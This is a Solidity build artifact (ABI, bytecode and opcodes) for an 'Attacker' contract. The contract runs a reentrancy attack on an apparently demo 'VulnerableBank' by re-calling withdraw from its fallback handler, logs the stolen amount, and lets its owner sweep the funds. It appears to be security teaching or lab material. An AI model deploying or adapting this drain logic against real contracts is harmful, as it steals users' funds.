{"contracts/Attacker.sol":{"Attacker":{"abi":[{"inputs":[{"internalType":"address","name":"_vulnerableBankAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AttackStarted","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"stolenAmount","type":"uint256"}],"name":"AttackSucceeded","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"balance","type":"uint256"}],"name":"ReceivedETH","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"MAX_REENTRY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"attackAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBankBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"reentryCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"vulnerableBank","outputs":[{"internalType":"contract VulnerableBank","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b506040516105af3803806105af83398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6105138061009c6000396000f3fe60806040526004361061008a5760003560e01c80637b83b50b116100595780637b83b50b1461020357806388193565146102225780638da5cb5b146102385780639e5faafc14610270578063a1c9aee1146102785761016c565b806312065fe0146101a15780633ccfd60b146101c357806353b38169146101d857806354cdb21b146101ee5761016c565b3661016c57604080513481524760208201527fc9a1ad483a7ca637eebe6b9ef2ee23277c04b79253311e94353321f808e267c691015b60405180910390a1600380549060006100d8836104b6565b919050555060026003541080156100fd57506002546000546001600160a01b03163110155b1561016a57600054600254604051632e1a7d4d60e01b81526001600160a01b0390921691632e1a7d4d916101379160040190815260200190565b600060405180830381600087803b15801561015157600080fd5b505af1158015610165573d6000803e3d6000fd5b505050505b005b604080513481524760208201527fc9a1ad483a7ca637eebe6b9ef2ee23277c04b79253311e94353321f808e267c691016100c0565b3480156101ad57600080fd5b50475b6040519081526020015b60405180910390f35b3480156101cf57600080fd5b5061016a610298565b3480156101e457600080fd5b506101b060035481565b3480156101fa57600080fd5b506101b0600281565b34801561020f57600080fd5b506000546001600160a01b0316316101b0565b34801561022e57600080fd5b506101b060025481565b34801561024457600080fd5b50600154610258906001600160a01b031681565b6040516001600160a01b0390911681526020016101ba565b61016a610333565b34801561028457600080fd5b50600054610258906001600160a01b031681565b6001546001600160a01b031633146102f75760405162461bcd60e51b815260206004820152601760248201527f4f6e6c79206f776e65722063616e20776974686472617700000000000000000060448201526064015b60405180910390fd5b6001546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610330573d6000803e3d6000fd5b50565b600034116103785760405162461bcd60e51b81526020600482015260126024820152714e6565642045544820746f2061747461636b60701b60448201526064016102ee565b34600281905560006003556040519081527f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a9060200160405180910390a160008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561040457600080fd5b505af1158015610418573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b81523460048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b15801561046357600080fd5b505af1158015610477573d6000803e3d6000fd5b505050507f87bdb4bdd764b85bcc2ac8c46ee07b3880e73be114fd9ab5c4dc42f45dd6cb16476040516104ac91815260200190565b60405180910390a1565b6000600182016104d657634e487b7160e01b600052601160045260246000fd5b506001019056fea264697066735822122033f6f8648d97513864a50e35b162139a5942f1b14bb293bc09e7ae74ccff8b4264736f6c63430008140033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x5AF CODESIZE SUB DUP1 PUSH2 0x5AF DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x5D JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP3 DUP4 AND OR SWAP1 SSTORE PUSH1 0x1 DUP1 SLOAD SWAP1 SWAP2 AND CALLER OR SWAP1 SSTORE PUSH2 0x8D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x513 DUP1 PUSH2 0x9C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x8A JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7B83B50B GT PUSH2 0x59 JUMPI DUP1 PUSH4 0x7B83B50B EQ PUSH2 0x203 JUMPI DUP1 PUSH4 0x88193565 EQ PUSH2 0x222 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x238 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x270 JUMPI DUP1 PUSH4 0xA1C9AEE1 EQ PUSH2 0x278 JUMPI PUSH2 0x16C JUMP JUMPDEST DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x1A1 JUMPI DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x53B38169 EQ PUSH2 0x1D8 JUMPI DUP1 PUSH4 0x54CDB21B EQ PUSH2 0x1EE JUMPI PUSH2 0x16C JUMP JUMPDEST CALLDATASIZE PUSH2 0x16C JUMPI PUSH1 0x40 DUP1 MLOAD CALLVALUE DUP2 MSTORE SELFBALANCE PUSH1 0x20 DUP3 ADD MSTORE PUSH32 0xC9A1AD483A7CA637EEBE6B9EF2EE23277C04B79253311E94353321F808E267C6 SWAP2 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x3 DUP1 SLOAD SWAP1 PUSH1 0x0 PUSH2 0xD8 DUP4 PUSH2 0x4B6 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x2 PUSH1 0x3 SLOAD LT DUP1 ISZERO PUSH2 0xFD JUMPI POP PUSH1 0x2 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE LT ISZERO JUMPDEST ISZERO PUSH2 0x16A JUMPI PUSH1 0x0 SLOAD PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x2E1A7D4D SWAP2 PUSH2 0x137 SWAP2 PUSH1 0x4 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x151 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x165 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x40 DUP1 MLOAD CALLVALUE DUP2 MSTORE SELFBALANCE PUSH1 0x20 DUP3 ADD MSTORE PUSH32 0xC9A1AD483A7CA637EEBE6B9EF2EE23277C04B79253311E94353321F808E267C6 SWAP2 ADD PUSH2 0xC0 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SELFBALANCE JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1CF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16A PUSH2 0x298 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1E4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B0 PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1FA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B0 PUSH1 0x2 DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x20F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE PUSH2 0x1B0 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x22E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B0 PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 SLOAD PUSH2 0x258 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1BA JUMP JUMPDEST PUSH2 0x16A PUSH2 0x333 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x284 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH2 0x258 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x2F7 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x17 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F6E6C79206F776E65722063616E207769746864726177000000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP2 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x330 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLVALUE GT PUSH2 0x378 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x4E6565642045544820746F2061747461636B PUSH1 0x70 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x2EE JUMP JUMPDEST CALLVALUE PUSH1 0x2 DUP2 SWAP1 SSTORE PUSH1 0x0 PUSH1 0x3 SSTORE PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH32 0x33F040BCC293552B556FB3082B0E9FB26495AEAE16EF365BD761C702978EEC0A SWAP1 PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE CALLVALUE PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP4 POP PUSH4 0x2E1A7D4D SWAP3 POP PUSH1 0x24 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x477 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH32 0x87BDB4BDD764B85BCC2AC8C46EE07B3880E73BE114FD9AB5C4DC42F45DD6CB16 SELFBALANCE PUSH1 0x40 MLOAD PUSH2 0x4AC SWAP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x4D6 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLER 0xF6 0xF8 PUSH5 0x8D97513864 0xA5 0xE CALLDATALOAD 0xB1 PUSH3 0x139A59 TIMESTAMP CALL 0xB1 0x4B 0xB2 SWAP4 0xBC MULMOD 0xE7 0xAE PUSH21 0xCCFF8B4264736F6C63430008140033000000000000 "},"methodIdentifiers":{"MAX_REENTRY()":"54cdb21b","attack()":"9e5faafc","attackAmount()":"88193565","getBalance()":"12065fe0","getBankBalance()":"7b83b50b","owner()":"8da5cb5b","reentryCount()":"53b38169","vulnerableBank()":"a1c9aee1","withdraw()":"3ccfd60b"}}}}}